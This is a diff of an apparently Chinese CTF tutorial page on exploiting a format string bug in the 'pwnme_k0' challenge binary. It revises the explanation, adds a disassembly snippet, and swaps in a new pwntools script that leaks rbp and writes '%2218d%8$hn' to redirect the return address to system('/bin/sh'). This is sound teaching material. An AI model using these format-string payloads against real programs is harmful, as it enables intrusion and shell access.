@@ -4583,16 +4583,16 @@ add [eax] ebx; ret;     # [printf@got] = [printf@got] + addr_offset
 
 <p>好，这就差不多了。此外，也可以发现这个账号密码其实没啥配对不配对的。</p>
 <h4 id="_18">利用思路<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h4>
-<p>我们最终的目的是希望可以获得系统的shell，可以发现在给定的文件中，在00000000004008A6地址处有一个直接调用system('bin/sh')的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了shell。</p>
-<p>虽然存储返回地址的内存本身是动态变化的，但是其相对于rbp的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下</p>
+<p>我们最终的目的是希望可以获得系统的 shell，可以发现在给定的文件中，在 0x00000000004008A6 地址处有一个直接调用system('bin/sh') 的函数（关于这个的发现，一般都会现在程序大致看一下。）。那如果我们修改某个函数的返回地址为这个地址，那就相当于获得了 shell。</p>
+<p>虽然存储返回地址的内存本身是动态变化的，但是其相对于 rbp 的地址并不会改变，所以我们可以使用相对地址来计算。利用思路如下</p>
 <ul>
 <li>确定偏移</li>
-<li>获取函数的rbp与返回地址</li>
+<li>获取函数的 rbp 与返回地址</li>
 <li>根据相对偏移获取存储返回地址的地址</li>
-<li>将执行system函数调用的地址写入到存储返回地址的地址。</li>
+<li>将执行 system 函数调用的地址写入到存储返回地址的地址。</li>
 </ul>
 <h4 id="_19">确定偏移<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h4>
-<p>首先，我们先来确定一下偏移。输入用户名aaaaaaaa，密码随便输入，断点下在输出密码的那个printf(&amp;a4 + 4)函数处</p>
+<p>首先，我们先来确定一下偏移。输入用户名 aaaaaaaa，密码随便输入，断点下在输出密码的那个 printf(&amp;a4 + 4) 函数处</p>
 <div class="codehilite"><pre><span></span>Register Account first!
 Input your username(max lenth:20): 
 aaaaaaaa
@@ -4631,7 +4631,7 @@ Register Success!!
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
 </pre></div>
 
-<p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为5+3=8。</p>
+<p>可以发现我们输入的用户名在栈上第三个位置，那么除去本身格式化字符串的位置，其偏移为为 5 + 3 = 8。</p>
 <h4 id="_20">修改地址<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h4>
 <p>我们再仔细观察下断点处栈的信息</p>
 <div class="codehilite"><pre><span></span>0x00007fffffffdb40│+0x00: 0x00007fffffffdb80  →  0x00007fffffffdc30  →  0x0000000000400eb0  →   push r15     ← $rsp, $rbp
@@ -4644,39 +4644,54 @@ Register Success!!
 0x00007fffffffdb78│+0x38: 0x0000000000400d4d  →   cmp eax, 0x2
 </pre></div>
 
-<p>可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用showaccounth函数时执行push rip所存储的值)，在格式化字符串中的偏移为7。</p>
-<p>与此同时栈上，第一个元素存储的也就是上一个函数的rbp。所以我们可以得到偏移0x00007fffffffdb80-0x00007fffffffdb48=0x38。继而如果我们知道了rbp的数值，就知道了函数返回地址的地址。</p>
-<p>0x0000000000400d74与0x00000000004008A6只有低2字节不同，所以我们可以只修改0x00007fffffffdb48开始的2个字节。</p>
+<p>可以看到栈上第二个位置存储的就是该函数的返回地址(其实也就是调用 show account 函数时执行 push rip 所存储的值)，在格式化字符串中的偏移为 7。</p>
+<p>与此同时栈上，第一个元素存储的也就是上一个函数的 rbp。所以我们可以得到偏移 0x00007fffffffdb80 - 0x00007fffffffdb48 = 0x38。继而如果我们知道了 rbp 的数值，就知道了函数返回地址的地址。</p>
+<p>0x0000000000400d74 与 0x00000000004008A6 只有低 2 字节不同，所以我们可以只修改 0x00007fffffffdb48 开始的 2 个字节。</p>
+<p>这里需要说明的是在某些较新的系统(如 ubuntu 18.04)上, 直接修改返回地址为 0x00000000004008A6 时可能会发生程序 crash, 这时可以考虑修改返回地址为 0x00000000004008AA,  即直接调用 system("/bin/sh") 处</p>
+<div class="codehilite"><pre><span></span>.text:00000000004008A6 sub_4008A6      proc near
+.text:00000000004008A6 ; __unwind {
+.text:00000000004008A6                 push    rbp
+.text:00000000004008A7                 mov     rbp, rsp
+.text:00000000004008AA &lt;- here         mov     edi, offset command ; &quot;/bin/sh&quot;
+.text:00000000004008AF                 call    system
+.text:00000000004008B4                 pop     rdi
+.text:00000000004008B5                 pop     rsi
+.text:00000000004008B6                 pop     rdx
+.text:00000000004008B7                 retn
+</pre></div>
+
 <h4 id="_21">利用程序<a class="headerlink" href="#_21" title="Permanent link">&para;</a></h4>
-<p>这里使用data[1:]的原因是当我们split的时候由于起始的是0x，所以会产生‘’字符串，需要跳过。</p>
 <div class="codehilite"><pre><span></span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">LibcSearcher</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">pwnme</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
-<span class="k">if</span> <span class="n">args</span><span class="p">[</span><span class="s1">&#39;REMOTE&#39;</span><span class="p">]:</span>
-    <span class="n">sh</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="mi">11</span><span class="p">,</span> <span class="mi">11</span><span class="p">)</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">sh</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./pwnme_k0&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;%p&#39;</span> <span class="o">*</span> <span class="mi">9</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;a&#39;</span> <span class="o">*</span> <span class="mi">8</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;1.&#39;</span><span class="p">,</span> <span class="n">drop</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39;0x&#39;</span><span class="p">)</span>
-<span class="k">print</span> <span class="n">data</span>
-<span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="mi">1</span><span class="p">:]</span>
-<span class="n">rbp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">5</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span>
-<span class="n">ret_addr</span> <span class="o">=</span> <span class="n">rbp</span> <span class="o">-</span> <span class="mh">0x38</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;2&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span><span class="o">=</span><span class="s2">&quot;debug&quot;</span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span><span class="o">=</span><span class="s2">&quot;amd64&quot;</span>
+
+<span class="n">sh</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./pwnme_k0&quot;</span><span class="p">)</span>
+<span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;pwnme_k0&quot;</span><span class="p">)</span>
+<span class="c1">#gdb.attach(sh)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;%6$p&quot;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;0x&quot;</span><span class="p">)</span>
+<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">sh</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x38</span>
+<span class="n">success</span><span class="p">(</span><span class="s2">&quot;ret_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
+
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;2&quot;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;:</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">)</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;</span><span class="si">%2214d</span><span class="s1">%8$hn&#39;</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s1">&#39;&gt;&#39;</span><span class="p">)</span>
-<span class="n">sh</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s1">&#39;1&#39;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="c1">#sh.writeline(&quot;%2214d%8$hn&quot;)</span>
+<span class="c1">#0x4008aa-0x4008a6</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;</span><span class="si">%2218d</span><span class="s2">%8$hn&quot;</span><span class="p">)</span>
+
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">writeline</span><span class="p">(</span><span class="s2">&quot;1&quot;</span><span class="p">)</span>
+<span class="n">sh</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 <span class="n">sh</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </pre></div>
 
